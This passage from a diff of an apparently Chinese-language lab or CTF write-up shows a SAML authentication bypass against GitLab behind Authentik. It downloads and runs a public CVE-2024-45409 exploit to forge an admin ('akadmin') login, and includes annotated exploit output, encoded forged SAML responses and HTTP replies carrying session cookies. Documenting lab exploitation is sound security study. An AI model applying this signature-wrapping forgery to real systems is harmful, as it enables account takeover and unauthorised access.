JfWvgwbyrOpTcriOrNMnYHGpQp405T9KWCYI%2BkeTDPw%2BYsGs8i1hlQBwgTSu8CiH%2FbEVY2hdQ%2BvpPpk92lcsX5jF7peAF9YGpMCFcMb60k32VayvbBIUw%2BHKSIjzAsdH6jtEVr0ISSbDOGFPQiJSXZzNPf6AF%2BegB0WRstqAYFY6Fqkx4h2zGC33g6rzWKrhQNk8q4rqZh926VvifAlpt8CfR%2BMn8LeAudz4IX0acje%2FwhCcL%2B2wYskCLw5sSw9dRHdCwwdCdq%2B1QwKn5RDsjJjl1DKvMRajpaZKL3GabKhepihtYanOTqYzyS97zeRzR01jeMYOfYtvTyfcNg5NZF0oUeZxQaJxRCJwSzuIMDSQRhkbo1IU9TLSGmBNDgIyKv08EPaHy%2Frq8RGGxox13Tfx7Z1hJ3NsfM3WS3wcuZu7NZbZoWbH9P5TFjLmVfo1TnPLralZ5Iu9Gv6ldOeo7PPnAaeow0mko8M3Ugs8oY0n31gAXuwwuWrrmuephWWjkj6Ps9Ge%2FAb0MIMcrMJlwNMMPNZwo08hx722w1DtXwB6wLMB%2FnZYUN2WOrmabqyx8WoTswinFhEDUlTigSV9KPgnFfoVpvPNqh%2FqSouTi4LYZGvDzdR8w0tJuuUGltTOiGBGMmHm7zewsIWGda7tZdvlYPae4ZcBxOwwyiUsHI%2BbRi%2BIo8ZGm0m0Qt2XeU7HcWbdnJUNlgVmL5xqW11NYgyKaglstrHyOJCDtxiPgMXh3y9pAO00Qk4DyP1cjUUZE2zl2o7Xqa4qbs9hvqH0ePc4aqUNoJWer0eSsKk7GytzGcTX1dtoC6RZitOPpwuSJhVr9BZPWVWIzjhDiF3Cr%2FQTixH7qEtn7tsRSWxj1aacb6mznwGb4flpPPjwDCbvi1PN0U8pYvrwnVt0bfsxLCUrXMeB9JVeQo1l1fV5OCDvxACrSK7YpjPjLruTkcCFnGmbZBkXHlaTt6gENF5SINbTa0ig3Y2UDx4RqTQ2CD2jKUjY7ApwpOK9vPZsTvUhkCbijvmi2jHYNFmy6v5xi9G6tTGkmYErjsyG%2F6yZbzs2p3oA3aIiIOxiZa4YQNf8CVk2VsNyxcHtxJoQrebSx3Q6WW1VWhHIqOms4jrVvRlokexDZ5hgXVLVLjg1XKHWjdwsbJUvJIHtrtdne06ZBbUwguWWdKtSZu3abc87UTbk2pvwXDdAd60uK42JG%2BabHQzFyq41JSEY5RW1PITNVmshhui66smShdrydmNDUuDLKEd%2BSjxUm9qIF90WKe1LcSsvV63dxxAMHeWl8Z7h2cyqdDXBrqTPRgbzSnbaYheSXxVGLCuGcfYMZGKO56G0jbw6XwactGSAYfzEs%2FOLF64Sx7xN3Hmgjx1Rrxyp1%2FcKK9ZtqbrJhYsOAyyJsjmswPJEUkwFH65aJbE0oFBHEPxWTNXF0VN%2B2SUlhG%2BrwdmP50U5pB26JClPHQNoi71jiXwxWJty1Znd%2FooUAofHs5Tx8mFlO7GcfDJYx%2F3LS7vdNG0d5nVVfRNrdNwdUjDnN1lmzGcz2x1ynNf9a0ty7e7IR93pQLDnSiMCxjlb%2BqaRpSkZxOfdDSPpyGkw5mD4aD7M1OuGJ6dz7RYFqHFYJWLUpoQ77xf12TMLsnEHIybGGp0a2mtWlBRheA3MSPOYamyvC5G6JpDbiWwpH%2Bhi9PWYxt4BxIvU1rKt41L2yVrYZLTXSLhShQsScVjbNuwXDjo7OwyHdxhUkt83xLzWcxud5McWsClmcgn9cgqIrNcn3N0JbAdIx7dc0Lr49YllVTXcnD176DuduoMb2sVogLPZ9XBCKlmixg5Z28uKQqp3CXdbne07%2FDaEulopgiFU5ZfeKzpDvlRkNy6NZU2LnS%2FsiBgSS7iXMjGceQihtZ2aROQYoGnWtxDzvZGddiBXx3sayX3vtRuLuyCEtYEeC%2Bs9n0K7eEOaGFKluIz9snG3BtfxcqJQ5poq9n%2BdUmDe61Y781SHDO0Tx1fPtXLo8nm3E5kBYTYokPdgedCVyNESrRIJd9M52IG1pWpr1EoXo%2BhoURpqMdrI7kej%2Bebja%2FrM85ql4nyhNO49NGBAwibgobwPFWgpc3JKCQHMG4V4UI6Mguy6Prv76%2FQr3%2B3n8Qff8r38ae%2F7J%2F%2B1t9LKqNzL4HXvo9kUMUL3AMPXuUOqMX%2BqbxHviGvksR%2Fuj%2Fgnfa5K5oq8ACVwH98cYBx8qR4r87eMH8%2Bji2LMLlvvBeNby%2F%2B3zcTvPzZDZw6qD9KwV8A3bV%2BkMtWKZSaDtug%2FlRMIvdiEqWeYRS0W3TAtEpABflfNVtAI%2BNNsV9Q%2BDL1zhWs8JP7dHOnxwTAZqB38qXQXb61gv6A%2F3sn5ZkG3Ip7IR7kQJeH1%2BE%2FldHv6AboxAAeQuEHw%2FdHF7x8kZXnkiS1cnESxTAYx5cB5roEArsrH0cICvdQNHRQGINJAg1RykfwEHdhAvN9ULq%2F4%2F0B6c%2BcgT3aYPiwzmcRm4GmHqi3Xn7b9%2FOevfs6IFbBV1%2FWvgqah8Degf9aVFZl3b474pfgv5j7SfbDph8M27ZO3K4N%2FnHi4R7kPyrVxouD3Gm%2BgfK0KZ3qtWTtm3vVikPgk%2Fj35kU7QkCLJG8gsDbJHN%2Bv722yr8hvr%2B%2FGacu6%2B59%2Fh%2BcH3Z%2BXfZX%2BL8EnBd5nPlo3Pzo7H53bl38B
-```
-</details>
-
-#### 试过这个不行，果然POST和GET是有巨大差别的
 ![图片](images/2026033007.png)
 ### 我找到官方给的Burpsuite拦截的路径了，重新上面的步骤
 #### 如果我们回顾一下 Gitlab 登录页面，会有一个选项可以输入凭证或者使用单点登录。此外，由于我们已经通过 Authentik 进行了身份验证，点击仪表板上的应用程序会执行单点登录流程，以让我们对这些应用程序进行身份验证。如果我们拦截 Gitlab 的单点登录过程，也就是 SAML 身份验证过程，我们就能获取一个可见的 SAML 令牌，对其进行解码，然后对其进行修改，以尝试以另一个用户的身份获取访问权限。在这种情况下我们将尝试获取管理员账户（akadmin）的访问权限。
@@ -720,28 +537,31 @@ GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
 #### 将其保存saml.xml
 ```
 [★]$ vi saml.xml
+
+[★]$ wget https://raw.githubusercontent.com/synacktiv/CVE-2024-45409/refs/heads/main/CVE-2024-45409.py
+[★]$ pip3 install lxml
 [★]$ python3 CVE-2024-45409.py -r saml.xml -n akadmin
 [+] Parse response
 	Digest algorithm: sha256
 	Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#
-[+] Remove signature from response
-[+] Patch assertion ID
+[+] Remove signature from response //删除原签名
+[+] Patch assertion ID		//修改 Assertion
 [+] Patch assertion NameID
-[+] Patch assertion conditions
+[+] Patch assertion conditions		//Conditions修改时间限制：NotBefore、NotOnOrAfter；否则SAML 可能会过期 → 登录失败
 [+] Move signature in assertion
-[+] Patch response ID
-[+] Insert malicious reference
-[+] Clone signature reference
-[+] Create status detail element
-[+] Patch digest value
+[+] Patch response ID		//冒充用户 akadmin
+[+] Insert malicious reference		//插入恶意引用	
+[+] Clone signature reference	//克隆签名引用
+[+] Create status detail element	//插入 StatusDetai，隐藏/承载恶意结构（绕解析）
+[+] Patch digest value		//重新计算摘要
 [+] Write patched file in response_patched.xml
 ```
-#### CyberChef:"Raw Deflate","To Base64","URL Encode(Encode all special chars)"
+#### CyberChef:"Raw Deflate","To Base64"
 <details>
 <summary>Output</summary>
 	
 ```
-7XhXj%2BLMtvY9Ev%2Bh1e8l6nFO6J3RccDYgBMGbHPzyaEcwAkHsPn1u%2Bgwu2fOvHNm7%2BtPQoJaVfXwrFRVa%2F3d%2BkVez7egrauyBU9DkZft%2FFX49blvynnlt1k7L%2F0CtPMunNu8tpnjX9B53VRdFVb586ctv9%2Fhty1ouqwqP7ZE7dfntOvqOYLcbrcvN%2BJL1SQIjqIognIIXBO1WfLXx%2Boi%2Bj18ATo%2F8jv%2FY%2F0AyvAf8DEEJR%2F4cAWEP4Cmhay%2BPkOU5ye1bXuglm3nlx0UoTj9ghIvBLrD8DmOz1Hy%2BPwkgbbLSv%2Bhy9s%2FtPAvkqzL%2FeBL4DdNBpov1xzpob4t4vddijysg4R%2Bngd%2BeIZ%2FIn19VqUXDgc0xzLxCxmT4QtJAPKFRWnyxQcRVAVDOSqOnr%2B9umj%2Byqv59kADZZed%2F37F%2FBC%2Fu9Hu%2FK5vfxyJVQSeDn7eg9%2FbD2oMV8%2FtPgxB2z4jP6JI0LpZ%2Fu3vqIWxEoMGmg487bfq1%2Be%2F%2Fh%2FNcXgQsVQY4YAkcIyjMBrDaEAAlONoknr%2BNnns2zV%2B2cZVU7Tfpj8Knvg8qZqsS4s%2FCQhQXkFe1SB6gSPohb4BkO1%2FCokhGPqAfAFD%2BBJiZPnXGwjyK6ZSlkCXa6BLq%2BgPkP8dXW3q4xT9nd4bzqszvgWSQCoxXRkBlcnq3bGrcmaYIMtPnoN24Rb6pT44yKlKtK%2BvrD5vfif63RWvgl%2F56wfheyjxH4n4c%2BjDqPy%2FnfknGfJnMQsVsD88%2BG6gxxhEahlX7wLRL6syg5mT3V%2Fz7Y998Gvvfv7L%2F9Cdj9h7KaoG%2FNW0%2FstPjv0vcuKngP3%2FSfGI61jlZv0ok2eAZUBH674MTic6QSOBM8lzNORHhjbpY1Fd%2BT9Mil8F1fcQeNuX6uGWNFYHYhWaSbqtu0yVyexaeVoo8r7smQB1HQpbi%2Bi20He76NQ6Xq%2BtGaVa75IqmU0n4DJTmX7FHMJLIK7a89JaNMqpxukLYMKw7wOjGSU6H4nIM0Y85S%2BGZaMqwd7siCAPdTCd4JsbMnPuYEBti2sqc7chXY0%2Fmvy2WMazpEqPjMne1XPpOTI5Iku7wi%2BL5miwmYdymlpMJ9JMR%2FJxr3hrlAbNCVgGwdb3o3vOuz7DL8L6erhStuI41v5yGbUl1lKGuVaPg0lwnISV08nMN7ONKWf1SiKM28xYHOlYLo2kOdnSMXG5ay4BRZGq6IavfILEN7QwiMpAl3suuyz91XRyFHZSrZcnm8cXPXLNt1m8ybg8WQRj4B3WZ8Hyd4vKMbHTeSAvy2F%2FVy%2BXtZf0R6FUNO88nUTYzuFYTlg3azEVqI1dODMzLNacw7vbO1nZzLgJR42llybe0kfWi2iGkGpCc3JVwUV9OjEl7irtwaFDQXU4y3qQnhj1YJVuq6%2FQSKUXgbjOFFqXRlzGWq9oVkdXlFmGmo3V5Uxx04mopDYEaLsLFRRmfVHk2qxX6OG6kTqxCDZXiturhLoOOnmg0mgmXvJV6vKkwImxO%2FbqdIJ0SbjbmuPijigeka2cM9YyaWut0yY81sJqmGVqWRmHq7K3pYwm4lylb83o9WrrX%2Fca9MW9UKWwX%2FotKwi7tFFMAydD95YwR%2FPIFAs1EpVbQnGqYJ%2FfEuGnmH4L9DUYP4W9S6GcBF9In4bi4yKI4fnagW%2Baqsr7uyjy9z7hb6rAJ6q17iybo%2B7GLqP3acAYVVGRncTrQnK%2BpOdsyd1QgbdamZd4MJ1o29ttmXjSwbIkSdDTyN1WR4dCfadNtBM%2F6iI5aCKJaQLpSjsV1XbqoEsLTLsnNx2rXBjEOxV7le6%2BS2%2BH0%2BKiicmSx%2FYL%2FnZLPfeA%2BstDHy3zRpX1PFh6XYjnZVAcYACpCz0Py219LOBF6m5zbaveFvwrp7XE5585DbLE20KiHwS%2B1UTsDWk6%2BcCC9hDV08%2B6LmSeN0Q%2BYfnHvJis4W9Ii7TZ5TLGB5QRppNMGmWJ2K2VpcB1coluVVQGxdEXY3HAt3vnfhEPs9G8C7P4LmJmzO61RDXZKAHHoiYUazpZEtGprqU0O83UWbHYXTdWZFsp25y5sdtrDgY2ib676gsFVRVsWKwWYaEYO%2FMW2noD7tAOo1qhxtFZCnLNHnIiWd43IVj1deT3nLz3soOxJGuwj%2BxT45n0sNFZ1awwep1isxM7SPBQOx1Z%2FQITFVluGbSIE%2FN0sQ1swYunWhlP97Rt%2BjVJRLsxlILhYlQeRtTbZjFUzJ7z8oUBg1hu6g6YONYqm3uEnmcsKpoX5Gg6uduqfrzC2JUhzyxHlNg1oshFINZclkZEbdnHy9mfTlBlwO9beRwEYXnrKudqbJzz7DILAm8TuV5mu4biH8eBDUyZI%2Fb4xdxL6C6aqcCq2b4cphO7aXrnwKAbSuhaLBvp0CrYKxJjWxmx0M4y68Tm%2FSWSDqGdGDw5bG6Cu8VGsCxjxyRu08mh3zW2yu%2BNYCxmyUogk6Uim8UyKkfO6VLNskEQjMJSPilCmF96h9%2BRu4TZ2csEp%2BzHoSZXiOspFlnMdkGt8szWa08N4M8nWjF4X2OTtneZi7KJdOZGkEsqJ4F7zUy0lM1qRbhXeLCKXErrg9hfL76yiIUZNwsBnmf9gvVkjw8qZ7XxQq0JZ4LU79BlR23NlpX3ezG57mdmPZ0YmSQY3cYqHO7uihZlb4LI3BN8udD81diKPMwS3tcPmqzd9hbMly265S0FERbhbeutJIiwX7nhOV37spBr5XZhEys9RMlxf89XFratNbkubXRr2YfU32O1dHCGyrOp%2B9EZio2rQw5HnMqPIlUG8OSNlmkewDz1R6oO7r84UV6zbME3baq6aAzyFuTTyY6VmAwMZVTNWpzBfRTGMZIerT19MszzLRs1PKHWzSCs744h7M49MeRnGbmApD%2BHhwr6YrbwdLf3%2Bu2ocoYc7473XtJL7bwaxyFiD7f01lH6arvZe6vc7Wv%2BajbnmN6d40Jc5csxnk48814UkRm5iih3q6EYV5WBov1GHWcoIV%2FNBY8Z2U3MIta3QplHsJ4SdrZPrI9CRQuyOJ1Yqb5BZoNbzSrtjoXH9aJhUxFns%2F1gXzexxXeu1Zkll9QYdd3kzDGuTFHebhJiIWHXCloyOvGlo4Rii65g4uVGx0WefYIX%2FUK96%2BdVplFGAnDWCAXPs90ABb2Xn%2B67YLibFbXumOkkFZXVXY9d6NJ8I2fNKBobAV8cC4JWxV7YHIJjxm9HJWCN89Yq4NG%2FQvqr09uh4pYbA51O6p0dc62C2YXkLU9nAjGl01lRVnzkyxaO9bxQxqqTFyeZbPtdcVC1oOn2RpeW26h2EWhJKZECxKMo7LSJXQX3GMRw4VMtvSG%2BcuV6cifTO%2B9S67dI65YnccapC2ZWr%2Bn17Yys0R5qsddcIxI8xyODq1ynhiNhbaJYXnTBeXiulYv1vtqMOXE7%2B5HuNPhhLxbSaiOqGKMQQ9NPJ3HfYMyZ6bBav%2B790x64F6G5JPHmcohtIznH23RhZ5fD4Xj1KPjiokTrdOdC1RnxiBgkiLAseYQqzgaCe5JOIDpAKbeMZ9pBmLFlf%2Fv6%2Fgr9%2Bbr9JP64lB%2FjT1f2D9f6e0ll98EJhN37SIdVvCo9yfBV7sNa7J%2FKe%2BwL9irJopfHA97v5n3Z1iCEVABsMPjQOEVWvldnb5g%2F%2Fp1YlXH22PgoGt9e%2FL9vJoTFPAB%2BA5qPUvAXQA%2Btn%2FSqM0qj4eMONJ%2BKSexRTJLcHGdgu2ULmdYZrCD%2Fq2YLbGS8KfYLCj9NvXOFK6LsMd0%2B6AkA2gz2Tn4sdDHmrRX0B%2FzfOylzHnIrH4U4KKAuT6%2FDfyijP9Bt2ImBPNQyAsPXZz%2BKY5rg2JgjAYFieMRyJImzjM9QIcWQLMBQnw45jCVh74j0I5IlGIIOKYqkOBL14%2B94f0D6M2dojw4MH9b5LBJz2NSD9da33%2Fb9wnn4WAfFJvy6VU1kwuYhtDeIXovKumq6d0f8EvwXcz%2FIvtv0g2HXNVnQd%2BAfJ54eQf69Um3DFBR%2B%2BwWWp23l168l6619VK0UAj9Z9GhedCMCtciKFoFrs9yPoubRJvsZ%2Be313fpd1fT%2F8%2B%2Fw%2FKD747Kfpf9L8EmB95mP1s33zs5H5%2FbbvwA%3D
+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
 ```
 </details>
 
@@ -753,21 +573,21 @@ GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
 ```
 HTTP/2 302 Found
 Server: nginx
-Date: Mon, 30 Mar 2026 12:54:36 GMT
+Date: Tue, 31 Mar 2026 08:18:26 GMT
 Content-Type: text/html; charset=utf-8
 Location: https://gitlab.barrier.vl/
 Cache-Control: no-cache
 Content-Security-Policy: 
 Permissions-Policy: interest-cohort=()
-Set-Cookie: known_sign_in=TFQwZ3NxbWxRS1ljUzkySXFyNUtEQThKMXlvNUtxMWFmbk9uSHdxUXlzcmFJbTk1WnZ0OTI2WWw3M1EwMlBJNDRybG10VWRKZHhpc25yaHdrN0h0VXBLbnI5d3VxUzlkYS9QZUlCQ0I2cEt6R3FTNHFMdzR0d3NWTjd1VVR2ZkMtLVNnSUZyYjZWVVgyWmV5ckJTTU4vVXc9PQ%3D%3D--4b896f4299cad578f7e7df1ec908df5c9654cb44; path=/; expires=Mon, 13 Apr 2026 12:54:36 GMT; secure; HttpOnly; SameSite=None
-Set-Cookie: _gitlab_session=d7ffb73d24dd8373260293048077e739; path=/; secure; HttpOnly; SameSite=None
+Set-Cookie: known_sign_in=elZvM2RROFRNeGd2QmVDRnhvOHdVdHlmdnJiUHpQbWtJVlZMU2dMWGdwYkRXaE1qbHdNR2tPYVViaHFidW12R1Bidk1vVyszYXRnN1N4aHZlcGJiZnVmVnJabzN2cWRrVHlhM2x1MGVLTDZJUHhLMDZsYkx4a2M1ZmtwZ3l4WDItLW44UU9BT1Bsb2RMNk43K3lJM3p5aVE9PQ%3D%3D--66f9ecf23294cfc15440b3d35a9ee6f62716a7fa; path=/; expires=Tue, 14 Apr 2026 08:18:26 GMT; secure; HttpOnly; SameSite=None
+Set-Cookie: _gitlab_session=51597262572b8009947eb6fc5309e0e2; path=/; secure; HttpOnly; SameSite=None
 X-Content-Type-Options: nosniff
 X-Download-Options: noopen
 X-Frame-Options: SAMEORIGIN
-X-Gitlab-Meta: {"correlation_id":"01KMZCYWMVC88BGPSJBV3S0C6B","version":"1"}
+X-Gitlab-Meta: {"correlation_id":"01KN1FHYEGKARYPAJQ6250P7D2","version":"1"}
 X-Permitted-Cross-Domain-Policies: none
-X-Request-Id: 01KMZCYWMVC88BGPSJBV3S0C6B
-X-Runtime: 0.473371
+X-Request-Id: 01KN1FHYEGKARYPAJQ6250P7D2
+X-Runtime: 0.226688
 X-Ua-Compatible: IE=edge
 X-Xss-Protection: 1; mode=block
 Strict-Transport-Security: max-age=63072000
